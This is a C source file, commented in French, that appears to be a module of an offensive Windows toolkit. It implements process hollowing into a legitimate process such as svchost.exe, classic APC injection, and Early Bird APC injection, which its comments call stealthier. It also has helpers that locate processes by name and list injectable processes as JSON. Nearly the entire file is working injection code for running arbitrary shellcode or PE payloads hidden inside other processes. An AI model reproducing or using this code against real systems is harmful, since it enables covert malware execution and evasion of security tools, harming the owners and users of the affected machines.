/*
 * injection.c - Techniques d'injection de code
 *
 * Implémente plusieurs méthodes d'injection :
 * - Process Hollowing
 * - APC Injection
 * - Early Bird APC
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../../include/ntdefs.h"

#pragma comment(lib, "ntdll.lib")

/* Définitions NT */

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, 
                                                 PVOID Buffer, SIZE_T NumberOfBytesToWrite, 
                                                 PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(HANDLE ThreadHandle, PVOID ApcRoutine, 
                                            PVOID ApcRoutineContext, PVOID ApcStatusBlock, 
                                            PVOID ApcReserved);
typedef NTSTATUS (NTAPI *pNtResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress,
                                                   ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                                   ULONG AllocationType, ULONG Protect);

/* Fonctions internes */

static HMODULE g_hNtdll = NULL;

static BOOL InitNtdll(void) {
    if (g_hNtdll) return TRUE;
    g_hNtdll = GetModuleHandleA("ntdll.dll");
    return g_hNtdll != NULL;
}

/* Process Hollowing */

/*
 * Crée un processus en état suspendu pour le hollowing
 */
static BOOL CreateSuspendedProcess(const char* targetPath, 
                                   PROCESS_INFORMATION* pi, 
                                   STARTUPINFOA* si) {
    memset(si, 0, sizeof(*si));
    memset(pi, 0, sizeof(*pi));
    si->cb = sizeof(*si);
    
    // Crée le processus suspendu
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, si, pi)) {
        return FALSE;
    }
    
    return TRUE;
}

/*
 * Lit l'adresse de base de l'image du processus cible
 */
static PVOID GetProcessImageBase(HANDLE hProcess, HANDLE hThread) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        return NULL;
    }
    
    // PEB est à Rdx (x64) ou Ebx (x86)
#ifdef _WIN64
    PVOID pebAddr = (PVOID)ctx.Rdx;
    SIZE_T imageBaseOffset = 0x10; // Offset de ImageBaseAddress dans PEB (x64)
#else
    PVOID pebAddr = (PVOID)ctx.Ebx;
    SIZE_T imageBaseOffset = 0x08; // Offset de ImageBaseAddress dans PEB (x86)
#endif
    
    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;
    
    if (!ReadProcessMemory(hProcess, (PBYTE)pebAddr + imageBaseOffset, 
                          &imageBase, sizeof(imageBase), &bytesRead)) {
        return NULL;
    }
    
    return imageBase;
}

/*
 * Effectue le Process Hollowing
 * targetPath: chemin du processus légitime à créer (ex: svchost.exe)
 * payload: shellcode ou PE à injecter
 * payloadSize: taille du payload
 */
BOOL Injection_ProcessHollowing(const char* targetPath, 
                                BYTE* payload, 
                                DWORD payloadSize) {
    if (!targetPath || !payload || payloadSize == 0) return FALSE;
    if (!InitNtdll()) return FALSE;
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    BOOL success = FALSE;
    
    // Crée le processus suspendu
    if (!CreateSuspendedProcess(targetPath, &pi, &si)) {
        return FALSE;
    }
    
    // Récupère l'adresse de base de l'image
    PVOID remoteImageBase = GetProcessImageBase(pi.hProcess, pi.hThread);
    if (!remoteImageBase) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    
    // Unmap la section originale
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(g_hNtdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, remoteImageBase);
    }
    
    // Vérifie si c'est un PE ou un shellcode
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    
    if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
        // C'est un PE - injection complète
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
        
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            goto cleanup;
        }
        
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        PVOID preferredBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;
        
        // Alloue la mémoire dans le processus cible
        PVOID remoteBase = VirtualAllocEx(pi.hProcess, preferredBase, imageSize,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!remoteBase) {
            // Essaie sans adresse préférée
            remoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        
        if (!remoteBase) {
            goto cleanup;
        }
        
        // Écrit les headers
        if (!WriteProcessMemory(pi.hProcess, remoteBase, payload, 
                               ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            goto cleanup;
        }
        
        // Écrit les sections
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (section[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PBYTE)remoteBase + section[i].VirtualAddress;
                PVOID sectionSrc = payload + section[i].PointerToRawData;
                
                WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc, 
                                  section[i].SizeOfRawData, NULL);
            }
        }
        
        // Met à jour l'adresse de base dans le PEB
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        PVOID pebAddr = (PVOID)ctx.Rdx;
        SIZE_T imageBaseOffset = 0x10;
        ctx.Rcx = (DWORD64)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        PVOID pebAddr = (PVOID)ctx.Ebx;
        SIZE_T imageBaseOffset = 0x08;
        ctx.Eax = (DWORD)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
        
        WriteProcessMemory(pi.hProcess, (PBYTE)pebAddr + imageBaseOffset, 
                          &remoteBase, sizeof(remoteBase), NULL);
        
        SetThreadContext(pi.hThread, &ctx);
        success = TRUE;
        
    } else {
        // C'est du shellcode - injection simple
        PVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, payloadSize,
                                              MEM_COMMIT | MEM_RESERVE, 
                                              PAGE_EXECUTE_READWRITE);
        
        if (!remoteShellcode) {
            goto cleanup;
        }
        
        if (!WriteProcessMemory(pi.hProcess, remoteShellcode, payload, payloadSize, NULL)) {
            goto cleanup;
        }
        
        // Met à jour l'entry point
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        ctx.Rcx = (DWORD64)remoteShellcode;
#else
        ctx.Eax = (DWORD)remoteShellcode;
#endif
        
        SetThreadContext(pi.hThread, &ctx);
        success = TRUE;
    }
    
cleanup:
    if (success) {
        // Reprend l'exécution
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 0);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return success;
}

/* APC Injection */

/*
 * Injection via APC (Asynchronous Procedure Call)
 * Injecte du shellcode dans un thread existant
 */
BOOL Injection_APC(DWORD targetPid, BYTE* shellcode, DWORD shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;
    if (!InitNtdll()) return FALSE;
    
    BOOL success = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID remoteShellcode = NULL;
    
    // Ouvre le processus cible
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    // Alloue la mémoire pour le shellcode
    remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        goto cleanup;
    }
    
    // Écrit le shellcode
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        goto cleanup;
    }
    
    // Trouve un thread dans le processus cible
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPid) {
                hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, 
                                    FALSE, te.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    if (!hThread) {
        goto cleanup;
    }
    
    // Queue l'APC
    pNtQueueApcThread NtQueueApcThread = 
        (pNtQueueApcThread)GetProcAddress(g_hNtdll, "NtQueueApcThread");
    
    if (NtQueueApcThread) {
        NTSTATUS status = NtQueueApcThread(hThread, remoteShellcode, NULL, NULL, NULL);
        if (status == 0) {
            success = TRUE;
        }
    } else {
        // Fallback avec QueueUserAPC
        if (QueueUserAPC((PAPCFUNC)remoteShellcode, hThread, 0)) {
            success = TRUE;
        }
    }
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

/*
 * Early Bird APC - Injecte avant que le processus ne démarre vraiment
 * Plus furtif car l'injection se fait très tôt
 */
BOOL Injection_EarlyBirdAPC(const char* targetPath, BYTE* shellcode, DWORD shellcodeSize) {
    if (!targetPath || !shellcode || shellcodeSize == 0) return FALSE;
    if (!InitNtdll()) return FALSE;
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    BOOL success = FALSE;
    PVOID remoteShellcode = NULL;
    
    // Crée le processus suspendu
    if (!CreateSuspendedProcess(targetPath, &pi, &si)) {
        return FALSE;
    }
    
    // Alloue la mémoire pour le shellcode
    remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        goto cleanup;
    }
    
    // Écrit le shellcode
    if (!WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        goto cleanup;
    }
    
    // Queue l'APC sur le thread principal (suspendu)
    pNtQueueApcThread NtQueueApcThread = 
        (pNtQueueApcThread)GetProcAddress(g_hNtdll, "NtQueueApcThread");
    
    if (NtQueueApcThread) {
        NTSTATUS status = NtQueueApcThread(pi.hThread, remoteShellcode, NULL, NULL, NULL);
        if (status == 0) {
            success = TRUE;
        }
    } else {
        if (QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, 0)) {
            success = TRUE;
        }
    }
    
cleanup:
    if (success) {
        // Reprend le thread - l'APC sera exécuté au premier alertable wait
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 0);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return success;
}

/*
 * Trouve un processus par son nom
 */
DWORD Injection_FindProcessByName(const char* processName) {
    if (!processName) return 0;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    DWORD pid = 0;
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

/*
 * Liste les processus injectables (avec accès suffisant)
 */
BOOL Injection_ListInjectableProcesses(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    char* json = (char*)malloc(32768);
    if (!json) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    int offset = snprintf(json, 32768,
        "{\n"
        "  \"injectable_processes\": [\n");
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    int count = 0;
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            // Tente d'ouvrir le processus
            HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 
                                         FALSE, pe.th32ProcessID);
            
            if (hProcess) {
                CloseHandle(hProcess);
                
                if (count > 0) {
                    offset += snprintf(json + offset, 32768 - offset, ",\n");
                }
                
                offset += snprintf(json + offset, 32768 - offset,
                    "    {\"pid\": %lu, \"name\": \"%s\"}",
                    pe.th32ProcessID, pe.szExeFile);
                count++;
            }
        } while (Process32Next(hSnapshot, &pe) && count < 100);
    }
    
    CloseHandle(hSnapshot);
    
    snprintf(json + offset, 32768 - offset,
        "\n  ],\n  \"count\": %d\n}", count);
    
    *outJson = json;
    return TRUE;
}
